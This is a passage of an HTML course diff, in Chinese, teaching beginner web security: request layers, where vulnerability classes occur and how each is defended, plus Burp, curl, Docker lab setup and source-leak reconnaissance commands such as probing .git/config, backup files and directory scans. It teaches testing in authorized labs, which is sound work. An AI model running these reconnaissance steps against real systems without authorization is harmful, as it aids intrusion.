+<p>提示 3：HTML 注释不显示在页面上；也可以 Ctrl+F 搜 flag。</p>
+<p>找到后填到下面：</p>
+<blockquote class="note">🚩 本节含提交型 flag 挑战，请在交互版（dist/wei_web.html）里作答。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>你是怎么找到的？把过程写进笔记。</li><li>为什么说「数据一旦发送到客户端，就不能再假设它是秘密」？</li></ol>
+</article></section>
+<section class="mod" id="m-p2b"><h1>PART 2.5 · Web 全景与攻击面</h1><div class="sub">第 3 周 · 5 节</div><blockquote class="note">学漏洞之前，先建立「整张地图」：一次请求要穿过哪些层、每一段谁在做事、每一段可能出什么问题。这一 PART 是后面 PART 7 的索引——看到任何漏洞，你都能把它放回这张图上的某个位置。</blockquote><article id="l-p2b1">
+<h2>四类组件：谁在做事，各自负责什么</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能说清一次请求依次穿过哪四层，每层负责什么、哪一层「说了算」。</p></div>
+<p>把 Web 应用拆开看，只有四类组件。记住它们的分工，后面所有漏洞都能找到归属——<b>漏洞永远发生在「某一层把不可信的数据当成了可信的东西」的地方</b>。</p>
+<div class="tablewrap"><div class="tcap">四类组件与它们的作用</div><table><thead><tr><th>层</th><th>包含什么</th><th>负责什么</th><th>一句话</th></tr></thead><tbody><tr><td>客户端层</td><td>浏览器、前端页面、JS</td><td>呈现界面、响应用户操作、把操作组装成 HTTP 请求、保存 Cookie/Session</td><td>负责「显示与发起」</td></tr><tr><td>服务端层</td><td>应用服务、API、框架</td><td>解析请求、匹配路由、认证与鉴权、执行业务逻辑、组装响应</td><td>负责「判断与处理」</td></tr><tr><td>数据层</td><td>数据库、缓存、文件存储</td><td>持久化业务数据与状态、缓存热点数据</td><td>负责「记住」</td></tr><tr><td>运行环境层</td><td>云 / 容器 / K8s / 网络 / 中间件</td><td>承载并调度上面三层、决定部署形态与网络边界</td><td>负责「跑起来」</td></tr></tbody></table></div>
+<p>它们之间靠 <b>HTTP + JSON</b> 通信：前端把请求发给后端，后端读写数据库，最终把结果渲染回页面。这条链路就是下一节要拆的「六段旅程」。</p>
+<h3>四个必须记住的推论</h3>
+<ul><li><b>前端校验只影响体验，不影响安全。</b>浏览器里的一切都能被代理工具改掉——所以真正的判断必须在服务端。</li><li><b>Cookie / Token 是身份凭据</b>，存在客户端，因此天然是窃取目标（XSS、抓包、本机恶意软件）。</li><li><b>数据层的查询方式决定注入风险</b>：字符串拼接 = 高危；参数化/ORM 正确使用 = 低危。</li><li><b>运行环境决定暴露面</b>：端口、调试接口、管理后台、容器配置，都属于「这一层没管好」。</li></ul>
+<blockquote class="note">💡 一句话记住这四层：<b>浏览器负责「显示与发起」，服务端负责「判断与处理」，数据层负责「记住」，运行环境负责「跑起来」。</b></blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>一次请求依次穿过哪四层？</li><li>为什么说「前端校验形同虚设」？</li><li>哪个层决定「这个用户能不能做这件事」？</li><li>运行环境层管不好，会暴露什么？</li></ol>
+</article>
+<article id="l-p2b2">
+<h2>一次请求的六段旅程</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能把一次请求拆成六段，并说出每一段「这一步发生什么」。</p></div>
+<p>四层是「静态结构」，六段是「动态流程」。同一次请求，按时间顺序走完这六段，最后变成你看到的页面。</p>
+<div class="tablewrap"><div class="tcap">六段旅程（总览）</div><table><thead><tr><th>#</th><th>这一段</th><th>包含什么</th><th>这一步在做什么</th></tr></thead><tbody><tr><td>1</td><td>客户端</td><td>浏览器 / 前端</td><td>用户操作被组装成 HTTP 请求：URL、方法、请求头、Cookie、请求体</td></tr><tr><td>2</td><td>应用入口</td><td>路由 / 会话 / 认证鉴权</td><td>匹配路由、取出会话或 Token、确认身份、判断能不能访问</td></tr><tr><td>3</td><td>业务逻辑</td><td>订单 / 支付 / 权限判断</td><td>按业务规则处理：查库存、算金额、判权限、改状态、写记录</td></tr><tr><td>4</td><td>数据访问</td><td>SQL / ORM / 缓存 / 文件</td><td>读写数据库、缓存与文件，把结果返回给业务逻辑</td></tr><tr><td>5</td><td>外部依赖</td><td>第三方 API / 内网服务</td><td>调用支付、短信、对象存储、内网微服务，拼接结果继续处理</td></tr><tr><td>6</td><td>响应渲染</td><td>模板 / 前端 / 缓存</td><td>后端渲染模板或返回 JSON，前端渲染页面，缓存加速重复请求</td></tr></tbody></table></div>
+<ol class="steps"><li>在浏览器里点一下按钮，按 F12 → Network，找到这次请求。</li><li>看请求行与请求头：这段是「1 客户端」的产物。</li><li>看响应：状态码、Set-Cookie、返回内容——这段是「2 应用入口 + 6 响应渲染」的结果。</li><li>试着想：中间那三段（业务逻辑、数据访问、外部依赖）在这台服务器上发生了什么？</li><li>想不出来的部分，就是你要读源码/做实验才能看见的部分——漏洞就藏在看不见的段里。</li></ol>
+<div class="code"><div class="cbar">把六段画成一条线 · text</div><pre><code>[1 客户端] --HTTP--&gt; [2 应用入口] --调用--&gt; [3 业务逻辑]
+                                                    |
+                                                    v
+                                    [4 数据访问] --查询--&gt; [数据库/缓存/文件]
+                                                    |
+                                                    v
+                                    [5 外部依赖] --请求--&gt; [支付/短信/内网服务]
+                                                    |
+                                                    v
+                                    [6 响应渲染] --HTML/JSON--&gt; [回到浏览器]</code></pre></div>
+<blockquote class="note">💡 你能控制的只有第 1 段（发什么），能看到的主要是第 6 段（返回什么）。<b>做题的本质，就是通过「输入 → 输出」的差异，推断中间四段到底发生了什么。</b></blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>六段旅程按顺序是哪六段？</li><li>哪一段是「漏洞最集中」的地方？为什么？</li><li>你能直接控制和直接看到的是哪两段？</li><li>为什么说「做题的本质是推断中间四段」？</li></ol>
+</article>
+<article id="l-p2b3">
+<h2>逐段攻击点地图：漏洞放在哪一段</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>看到任意一个漏洞，能立刻说出它发生在六段的哪一段，并翻到本课程对应章节。</p></div>
+<p>这张表是 PART 7 的索引。以后你学每一类漏洞，都应该回来把它「钉」在六段图里的某个位置——钉不住，说明你还没真正理解它。</p>
+<div class="tablewrap"><div class="tcap">六段 → 攻击点 → 对应课程</div><table><thead><tr><th>段</th><th>这一段的攻击点</th><th>本课程对应</th></tr></thead><tbody><tr><td>1 客户端</td><td>URL 与参数可任意构造（越权遍历 ID、篡改金额）；前端校验形同虚设；XSS 偷走 Cookie/Token</td><td>p1l4 控制台 · p3l1 fetch · p5l5 XSS · p5l16 越权</td></tr><tr><td>2 应用入口</td><td>认证绕过（逻辑缺陷、弱口令、Token 可伪造）；会话固定、退出后会话仍有效；只在网关鉴权、后端接口可直连</td><td>p2l3 Cookie/Session · p5l15 JWT · p5l16 越权</td></tr><tr><td>3 业务逻辑</td><td>只判「登录了」不判「是不是他的」；流程可跳步/重放/并发；金额数量由前端提交后端照单全收</td><td>p5l16 逻辑漏洞与越权</td></tr><tr><td>4 数据访问</td><td>字符串拼接 SQL → 注入；反序列化/模板注入/表达式注入 → 代码执行；文件路径可控 → 路径穿越</td><td>p5l3/p5l4 SQLi · p5l7 穿越与包含 · p5l11 SSTI · p5l13 反序列化</td></tr><tr><td>5 外部依赖</td><td>请求地址或协议可控 → SSRF；依赖组件版本落后 → 已知 CVE；第三方返回数据未校验就信任</td><td>p5l9 SSRF · p4l2 ThinkPHP 版本 · p5l14 Java 组件</td></tr><tr><td>6 响应渲染</td><td>用户输入未编码进入 HTML → XSS；响应带出堆栈/内部 IP/数据库字段；缓存键设计不当 → 缓存投毒</td><td>p5l5 XSS · p5l2 信息泄露 · p6l3 信息收集</td></tr></tbody></table></div>
+<div class="tablewrap"><div class="tcap">每一段对应的防御位置</div><table><thead><tr><th>段</th><th>防御动作</th></tr></thead><tbody><tr><td>1 客户端</td><td>只做体验优化；不把安全判断放前端；HttpOnly + CSP 保护凭据</td></tr><tr><td>2 应用入口</td><td>统一鉴权中间件；Token 固定算法与强密钥；退出即失效；网关与后端都校验</td></tr><tr><td>3 业务逻辑</td><td>所有关键判断在服务端；对象归属校验（user_id 必须来自 session）；关键操作用事务与幂等</td></tr><tr><td>4 数据访问</td><td>参数化查询/ORM 占位符；不反序列化外部数据；文件路径白名单 + realpath 校验</td></tr><tr><td>5 外部依赖</td><td>出站白名单代理；依赖版本管理（SCA）；对外部数据校验后再信任</td></tr><tr><td>6 响应渲染</td><td>按上下文转义；错误信息不外露；缓存键包含用户/权限维度</td></tr></tbody></table></div>
+<blockquote class="note">💡 一个判断你是否真懂的测试：<b>随便挑一个漏洞，说出它发生在第几段、为什么这一段会出问题、应该在哪一段修。</b>说不出来，就回去读那一节。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>SQL 注入发生在第几段？为什么？</li><li>越权漏洞通常发生在哪两段？</li><li>SSRF 为什么属于「外部依赖」这一段？</li><li>缓存投毒属于第几段？为什么？</li><li>挑一个你学过的漏洞，说出它的段号与修复位置。</li></ol>
+</article>
+<article id="l-p2b4">
+<h2>学什么：四块能力地图与课程导航</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>把「Web 基础 / 工具链 / 开发与代码 / 漏洞与利用」四块能力，对应到本课程的 11 个 PART。</p></div>
+<div class="tablewrap"><div class="tcap">四块能力 → 本课程对应</div><table><thead><tr><th>能力块</th><th>学什么</th><th>对应 PART</th><th>学完的标志</th></tr></thead><tbody><tr><td>① Web 基础</td><td>HTTP/HTTPS、请求响应、状态码、Cookie/Session、Token/JWT、同源策略与 CORS、DNS 与代理</td><td>PART 2 / 2.5</td><td>能逐行拆请求、说清登录状态怎么维持</td></tr><tr><td>② 工具链</td><td>抓包与改包（Burp/Yakit）、curl、编解码、浏览器 DevTools、Docker 靶场</td><td>PART 1 / 3</td><td>能独立改包复现一次测试</td></tr><tr><td>③ 开发与代码</td><td>一门后端语言（PHP/Python/Java）、数据库基础、前端基础、Git 与 CI 概念</td><td>PART 4 / 5 / 6</td><td>能读懂一段源码，指出输入进了哪个函数</td></tr><tr><td>④ 漏洞与利用</td><td>OWASP Top 10、注入、XSS、CSRF、SSRF、文件类、认证与越权、反序列化、逻辑缺陷</td><td>PART 7 / 8</td><td>每类能写出最小复现和修复方式</td></tr></tbody></table></div>
+<p>这四块不是线性学完再回头，而是<b>循环</b>：学到漏洞（④）发现读不懂源码，就回代码（③）；读代码时看不懂请求，就回基础（①）；做不动实验，就补工具（②）。每循环一圈，你的理解都会深一层。</p>
+<ol class="steps"><li>先确认自己四块里哪块最薄：能不能拆请求？能不能读一段 PHP/Python？会不会改包？</li><li>最薄的那块就是这一阶段的主线，其它块保持「够用」即可。</li><li>每学完一个漏洞，回到六段图里定位它（p2b3），再看一眼四块地图。</li><li>三个月后重新做一次这个自评——你会发现「薄」的那块变了。</li></ol>
+<blockquote class="note">💡 这四块正好对应 PPT 里的知识地图。区别在于：PPT 告诉你「有哪些」，这门课告诉你「每一块怎么练、练到什么程度算会」。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>四块能力分别对应本课程的哪些 PART？</li><li>为什么这四块是「循环」而不是「线性」？</li><li>你现在最薄的是哪一块？依据是什么？</li><li>「学完的标志」这一列有什么用？</li></ol>
+</article>
+<article id="l-p2b5">
+<h2>方向前景：三类岗位与它们考什么</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>知道 Web 方向将来能做什么、每类岗位看重什么，并据此调整自己的学习重点。</p></div>
+<p>学之前先看清「以后能去哪」，你才知道该把时间花在哪。以 Web 为技术基石，企业安全岗大致分三条主线——它们都要求「懂 Web 怎么跑」，但侧重点完全不同。</p>
+<div class="tablewrap"><div class="tcap">三类岗位</div><table><thead><tr><th>方向</th><th>日常在做什么</th><th>核心场景</th><th>最吃哪块能力</th></tr></thead><tbody><tr><td>渗透测试 / 安全攻防</td><td>找漏洞、打点、写报告；研究新的攻击面与绕过</td><td>攻防演练（HVV）、白帽子众测、上线前渗透评估、边界突破打点</td><td>漏洞与利用（PART 7/8）+ 工具（PART 3）+ 流程与报告（PART 9）</td></tr><tr><td>应用安全 / DevSecOps</td><td>在软件全生命周期里推进安全（SDL），用 SAST/SCA 审计源码，制定规范，做安全左移</td><td>架构安全评审、API 网关鉴权治理、WAF/RASP 规则运营、越权与业务逻辑缺陷排查、SRC 审核</td><td>开发与代码（PART 4/5/6）+ 漏洞原理（PART 7）+ 读源码能力</td></tr><tr><td>终端与主机安全</td><td>服务器、办公终端、容器宿主机的加固与检测；分析恶意进程、外联与异常行为</td><td>EDR 检测与响应、主机加固、入侵排查</td><td>运行环境与网络基础 + 日志分析（本课程覆盖较少）</td></tr></tbody></table></div>
+<div class="tablewrap"><div class="tcap">按方向调整学习重点</div><table><thead><tr><th>你的方向</th><th>本课程重点</th><th>可以后补</th></tr></thead><tbody><tr><td>渗透 / 攻防</td><td>PART 7/8 全部 + 工具 PART 3 + 流程 PART 9</td><td>PART 6 的 Java/Node 细节</td></tr><tr><td>应用安全 / DevSecOps</td><td>PART 4 读源码 + PART 6 框架 + PART 7 原理</td><td>PART 3 的扫描器细节</td></tr><tr><td>主机安全</td><td>PART 0.5 命令行 + PART 2 HTTP + 网络基础</td><td>PART 7 中偏业务的逻辑漏洞</td></tr><tr><td>还没想好</td><td>按课程顺序走完前 10 节 + PART 7</td><td>到了大三再定向</td></tr></tbody></table></div>
+<h3>新手的三个常见误区</h3>
+<ul><li><b>只背 payload 不读原理</b>：换一个框架、换一个版本就全废。原理（六段图）才是可迁移的。</li><li><b>只看不做</b>：安全是动手学科。看完一节不敲命令、不打靶场，等于没学。</li><li><b>只学攻击不学修复</b>：真实岗位里「怎么修」比「怎么打」更值钱，企业要的是能解决问题的人。</li></ul>
+<blockquote class="note">💡 无论选哪条路，开头都会有一段「什么都做不了」的摸索期，这很正常。区别只在于：有人每周真的动手两小时，有人只是收藏了一堆教程。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10（岗位通用语言）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>三类岗位的核心区别是什么？</li><li>应用安全岗为什么更看重「读源码」？</li><li>主机安全方向，本课程哪块覆盖较少？</li><li>你更想走哪个方向？据此列出接下来三个月的主线。</li><li>「只学攻击不学修复」为什么是误区？</li></ol>
+</article></section>
+<section class="mod" id="m-p6"><h1>PART 3 · 工具与第一次解题</h1><div class="sub">第 3–4 周 · 5 节</div><blockquote class="note">先学会用工具、并且立刻去打最简单的题——不需要学完任何语言。这一 PART 的目标是：会用 Burp 改包、会起靶场、会查手册，并且打掉几道新手题。</blockquote><article id="l-p6l1">
+<h2>Burp Suite 四件套</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>会用 Proxy / HTTP history / Repeater / Decoder 完成一次完整改包，并知道每一步该看什么。</p></div>
+<p>Burp 是 Web 安全最核心的工具。但初学只需要四个功能——把这四个用熟，比装一堆插件有用得多。</p>
+<div class="tablewrap"><div class="tcap">四件套的分工</div><table><thead><tr><th>功能</th><th>作用</th><th>什么时候用</th></tr></thead><tbody><tr><td>Proxy 代理</td><td>浏览器流量经过 Burp，可拦截、修改、放行</td><td>需要「看」和「改」每一个请求时</td></tr><tr><td>HTTP history 历史</td><td>所有经过的请求，可搜索、筛选、重放</td><td>回头看「刚才那个请求长什么样」</td></tr><tr><td>Repeater 重放</td><td>改一个参数发一次，看响应变化</td><td>做题的实验台，90% 的时间在这里</td></tr><tr><td>Decoder 编解码</td><td>Base64 / URL / Hex / 字节互转</td><td>参数被编码、需要构造 payload 时</td></tr></tbody></table></div>
+<h3>十分钟装好并跑通</h3>
+<ol class="steps"><li>启动 Burp，确认 Proxy 监听 <code>127.0.0.1:8080</code>（Proxy → Options 里能看到）。</li><li>浏览器装代理插件（SwitchyOmega），把 HTTP/HTTPS 都指向 <code>127.0.0.1:8080</code>。</li><li>访问 <code>http://burp</code> 下载 CA 证书并安装到系统信任区——不装的话 HTTPS 全是证书错误。</li><li>打开 Intercept，刷新一个页面：请求被拦下 → Forward 放行 → 关闭 Intercept。</li><li>在 HTTP history 里找到刚才那条请求 → 右键 <b>Send to Repeater</b> → 改一个参数 → Send → 看响应。</li></ol>
+<div class="code"><div class="cbar">做题的标准循环（背下来） · text</div><pre><code>Proxy 抓到 / HTTP history 找到
+        ↓
+   右键 Send to Repeater
+        ↓
+   改一个变量（只改一个！）
+        ↓
+   Send → 对比：状态码 / 长度 / 关键词 / 时间
+        ↓
+   有变化 → 顺着改；没变化 → 换一个变量</code></pre></div>
+<div class="code"><div class="cbar">不装浏览器也能抓：curl 直接过代理 · bash</div><pre><code>curl -x http://127.0.0.1:8080 -k "http://target/?id=1"
+
+# 或者直接看脚本的请求（requests 走代理）
+# proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}</code></pre></div>
+<blockquote class="note">💡 一个能救命的习惯：<b>每次只改一个东西再发</b>。同时改三个参数，响应变了你也不知道是哪个起了作用——这是新手最常见的浪费时间方式。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/burp/documentation" target="_blank" rel="noopener">PortSwigger · Burp 文档</a></li><li><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy（免费靶场）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>Repeater 和 Proxy 的分工是什么？</li><li>不装 CA 证书会看到什么现象？</li><li>HTTP history 比浏览器 Network 强在哪？</li><li>为什么「一次只改一个参数」？</li><li>想在没有浏览器的情况下改包，用什么命令？</li></ol>
+</article>
+<article id="l-p6l2">
+<h2>Yakit、curl 与 CyberChef：更轻的三个工具</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>知道每个工具的定位，能按场景选对工具——而不是只会一个。</p></div>
+<div class="tablewrap"><div class="tcap">定位对照</div><table><thead><tr><th>工具</th><th>定位</th><th>最常用的场景</th><th>替代关系</th></tr></thead><tbody><tr><td>Yakit</td><td>国产免费的 Burp 替代</td><td>图形化抓包、重放、插件式扫描</td><td>新手友好的 Burp 替代</td></tr><tr><td>curl</td><td>命令行 HTTP 客户端</td><td>精确复现、脚本化、复制即用</td><td>和浏览器 Network 互通（Copy as cURL）</td></tr><tr><td>CyberChef</td><td>编解码瑞士军刀</td><td>多层 Base64 / 换编码 / 哈希识别</td><td>浏览器里就能用</td></tr><tr><td>DevTools</td><td>浏览器自带</td><td>看 DOM、看请求、跑 JS</td><td>一切的第一步</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">curl 必会参数 · bash</div><pre><code>curl -i   URL      # 带上响应头
+curl -I   URL      # 只要响应头
+curl -X POST -d "a=1&amp;b=2" URL
+curl -H "Cookie: session=xxx" URL
+curl -b "session=xxx" URL           # 等价写法
+curl -k   URL      # 忽略证书错误
+curl -L   URL      # 跟随重定向
+curl -x http://127.0.0.1:8080 URL   # 走 Burp 代理
+curl -o out.html URL                # 存文件</code></pre></div>
+<p>CyberChef 的典型用法：拿到一串 <code>ZmxhZ3t3M2J9</code> 这样的字符，丢进去试 Base64 解码；如果是套娃，用 <b>Magic</b> 自动猜。CTF 的编码题基本都在这里解决。</p>
+<blockquote class="note">💡 工具不在多。一个抓包工具 + curl + 一个编解码工具，就足够打到中级题。真正决定你水平的是「看懂响应差异」的能力，不是工具数量。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://www.yaklang.com/" target="_blank" rel="noopener">Yakit 官网</a></li><li><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a></li><li><a href="https://curl.se/docs/manpage.html" target="_blank" rel="noopener">curl 官方文档</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么说「工具不在多」？</li><li>CyberChef 最典型的用途是什么？</li><li>curl 的 -i 和 -I 有什么区别？</li><li>浏览器里怎么做才能拿到等价的 curl 命令？</li></ol>
+</article>
+<article id="l-p6l3">
+<h2>信息收集：把题目面积缩小</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>掌握目录扫描、指纹识别、备份文件探测、源码泄露还原的基本流程。</p></div>
+<p>信息收集不是「扫得越多越好」，而是<b>用最少的请求找到最有价值的东西</b>：源码、备份、隐藏路径、版本号。</p>
+<div class="tablewrap"><div class="tcap">四类收集动作</div><table><thead><tr><th>类型</th><th>动作</th><th>常用工具</th></tr></thead><tbody><tr><td>指纹识别</td><td>看响应头、报错页、Cookie 名、静态资源路径</td><td>curl -I、whatweb、Wappalyzer</td></tr><tr><td>目录与文件</td><td>常见路径、备份文件、编辑器临时文件</td><td>dirsearch、ffuf、自定义字典</td></tr><tr><td>源码泄露</td><td>.git / .svn / .bak / .zip / source map</td><td>GitHack、git-dumper</td></tr><tr><td>子域与端口</td><td>子域名枚举、常见端口探测</td><td>oneforall、nmap（仅授权目标）</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">常用动作（按性价比排序） · bash</div><pre><code>curl -I http://target                 # 1. 响应头指纹
+curl http://target/robots.txt         # 2. 隐藏路径
+curl http://target/.git/config        # 3. 源码泄露（200 = 存在）
+curl -s http://target/index.php.bak -o a.bak -w "%{http_code}\n"
+
+# 目录扫描（字典决定效果；比赛先用小字典跑一遍）
+python dirsearch.py -u http://target -e php,zip,bak,txt,swp
+
+# 指纹识别
+whatweb http://target</code></pre></div>
+<h3>处理顺序（先做最划算的）</h3>
+<ol class="steps"><li>先看题面有没有给源码/附件——给了就先读，不要在没读源码的情况下去扫目录。</li><li>再做响应头 + 首页源码（Ctrl+F 搜 flag / api / key）——成本最低。</li><li>接着试 robots.txt、常见备份名、.git/config——四个请求见分晓。</li><li>以上都没有，才上目录扫描——这时你要的是一份「更大的地图」。</li><li>扫到东西后立即停下来读，不要为了「扫完」继续消耗时间。</li></ol>
+<blockquote class="note">💡 在真实环境里做目录扫描必须<b>有书面授权</b>，并且控制并发；扫描可能触发告警、影响业务。课程里的练习一律在靶场或本地容器里做。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>目录扫描的目的是什么？什么时候该扫、什么时候别扫？</li><li>.git 泄露怎么还原源码？</li><li>为什么要猜 .bak / .zip 这类后缀？</li><li>信息收集的四类动作里，性价比最高的是哪个？</li></ol>
+</article>
+<article id="l-p6l4">
+<h2>Docker 搭本地靶场</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能在 Windows / WSL 里装好 Docker，一键起一个漏洞环境，并会排错。</p></div>
+<p>本地靶场是最安全的练习环境：随便打、随时重置、不违法。这也是 PART 0 强调的「合法练习」的落点。</p>
+<div class="code"><div class="cbar">装好 Docker（两条路选一条） · bash</div><pre><code># 路线 A：Windows 装 Docker Desktop（新手推荐）
+# 官网下载 -&gt; 安装 -&gt; 启动 -&gt; 左下角显示 Engine running
+
+# 路线 B：WSL Ubuntu 里装 docker（更接近服务器）
+sudo apt update
+sudo apt install -y docker.io
+sudo usermod -aG docker $USER     # 免 sudo，重新登录后生效
+docker --version</code></pre></div>
+<div class="tablewrap"><div class="tcap">常见靶场镜像</div><table><thead><tr><th>靶场</th><th>起法</th><th>端口</th></tr></thead><tbody><tr><td>DVWA</td><td>docker run -d -p 8081:80 vulnerables/web-dvwa</td><td>8081</td></tr><tr><td>SQLi-Labs</td><td>docker run -d -p 8082:80 acgpiano/sqli-labs</td><td>8082</td></tr><tr><td>Upload-Labs</td><td>docker run -d -p 8083:80 c0ny1/upload-labs</td><td>8083</td></tr><tr><td>XSS-Labs</td><td>docker run -d -p 8084:80 vulfocus/xss-labs</td><td>8084</td></tr><tr><td>Pikachu</td><td>docker run -d -p 8085:80 area39/pikachu</td><td>8085</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">日常命令与排错 · bash</div><pre><code>docker ps                 # 正在运行的容器
+docker ps -a              # 包括已停止的
+docker logs &lt;id&gt;          # 容器启动失败先看这个
+docker exec -it &lt;id&gt; bash # 进容器里看文件
+docker stop &lt;id&gt; &amp;&amp; docker rm &lt;id&gt;
+docker images             # 本地镜像
+
+# 端口被占用：换一个宿主机端口
+docker run -d -p 8090:80 vulnerables/web-dvwa</code></pre></div>
+<div class="tablewrap"><div class="tcap">起不来时按顺序查</div><table><thead><tr><th>现象</th><th>先查什么</th></tr></thead><tbody><tr><td>docker ps 里没有容器</td><td>docker ps -a 看是否 Exited；docker logs 看报错</td></tr><tr><td>浏览器打不开</td><td>容器端口映射对不对；宿主机防火墙；是否用了 127.0.0.1</td></tr><tr><td>curl 能通但浏览器不行</td><td>代理设置（Burp 还开着？）</td></tr><tr><td>镜像拉不下来</td><td>换国内镜像加速器；或先 docker pull 单独执行看错误</td></tr></tbody></table></div>
+<blockquote class="note">💡 在 WSL 里可以这样访问 Windows 上的靶场：<code>curl http://$(hostname).local:8081</code>；反过来 Windows 浏览器访问 WSL 里的服务，用 <code>http://localhost:8081</code> 即可（WSL2 默认能通）。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://docs.docker.com/" target="_blank" rel="noopener">Docker 官方文档</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么本地靶场是最安全的练习环境？</li><li>docker ps 和 docker ps -a 的区别？</li><li>容器起不来时第一步看什么？</li><li>端口被占用怎么办？</li></ol>
+</article>
+<article id="l-p6l5">
+<h2>外部手册怎么用：HackTricks 与 seccmd 攻击手册</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>把两个社区常用的手册变成自己的「字典」：卡住时知道查哪个词、查完怎么验证。</p></div>
+<p>这门课给你的是「体系和最小复现」；但每种漏洞的变体、冷门绕过、特定框架的 payload，多到没人能背完。<b>正确的做法是：会查，而不是会背。</b>下面两个站点，一个英文百科、一个中文速查，正好互补。</p>
+<div class="tablewrap"><div class="tcap">两个手册怎么分工</div><table><thead><tr><th>手册</th><th>是什么</th><th>怎么用</th><th>适合什么时候</th></tr></thead><tbody><tr><td>HackTricks</td><td>英文的渗透测试百科，按攻击面/漏洞名组织，覆盖面最广</td><td>在站内搜英文关键词，例如 SQL injection、XSS、file upload</td><td>想要「完整打法 + 变体」时</td></tr><tr><td>seccmd · Attack_CN</td><td>中文攻击手册速查</td><td>按分类找对应条目，对照 payload 和命令</td><td>想快速看中文步骤、确认写法时</td></tr></tbody></table></div>
+<div class="tablewrap"><div class="tcap">查什么词：漏洞 → 关键词 → 本课程对应节</div><table><thead><tr><th>漏洞</th><th>搜这个英文关键词</th><th>本课程</th></tr></thead><tbody><tr><td>SQL 注入</td><td>SQL injection</td><td>p5l3 / p5l4</td></tr><tr><td>XSS</td><td>XSS（cross site scripting）</td><td>p5l5</td></tr><tr><td>文件上传</td><td>file upload</td><td>p5l6</td></tr><tr><td>文件包含 / 路径穿越</td><td>file inclusion / path traversal</td><td>p5l7</td></tr><tr><td>命令执行</td><td>command injection</td><td>p5l8</td></tr><tr><td>SSRF</td><td>SSRF</td><td>p5l9</td></tr><tr><td>CSRF</td><td>CSRF</td><td>p5l10</td></tr><tr><td>模板注入</td><td>SSTI</td><td>p5l11</td></tr><tr><td>XXE</td><td>XXE</td><td>p5l12</td></tr><tr><td>反序列化</td><td>deserialization</td><td>p5l13 / p5l14</td></tr><tr><td>JWT</td><td>JWT</td><td>p5l15</td></tr><tr><td>越权 / 逻辑漏洞</td><td>IDOR / access control / business logic</td><td>p5l16</td></tr></tbody></table></div>
+<h3>查手册的纪律（重要）</h3>
+<ol class="steps"><li>先自己做 15 分钟：判断漏洞类型、试 2 个 payload——没有自己的尝试，查了也记不住。</li><li>卡住后再查：只看「下一步该怎么做」，不要整篇读完。</li><li>回到题目验证：手册里的 payload 90% 要按目标环境改（引号、闭合符、路径）。</li><li>验证成功后，把「为什么这样改」写进自己的速查表——这才是你的东西。</li><li>最后回课程对应节，把原理补上：手册给招式，课程给内功。</li></ol>
+<div class="code"><div class="cbar">一个典型的查手册循环 · text</div><pre><code>做题卡住
+  → 判断：这是哪一类？（对照 PART 7 的节）
+  → 搜：HackTricks 里搜英文关键词
+  → 挑：只挑和当前上下文相符的那一条
+  → 改：按目标的引号/路径/编码改 payload
+  → 验：Burp Repeater 发一次，看响应差异
+  → 记：把「生效的 payload + 为什么」写进笔记</code></pre></div>
+<blockquote class="note">💡 手册是字典，不是教材。只收藏不查、只查不复盘，都是白费——这也是「太笼统」的来源：课程给地图，具体路线要你自己在靶场上走一遍。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://book.hacktricks.wiki/en/index.html" target="_blank" rel="noopener">HackTricks（英文渗透百科）</a></li><li><a href="https://www.seccmd.net/Attack_CN/" target="_blank" rel="noopener">seccmd · Attack_CN（中文攻击手册）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>HackTricks 和 seccmd 各自适合什么时候查？</li><li>查手册之前，为什么要求先自己做 15 分钟？</li><li>手册里的 payload 为什么不能直接照抄？</li><li>查完一条 payload，笔记里应该记哪两样东西？</li></ol>
+</article></section>
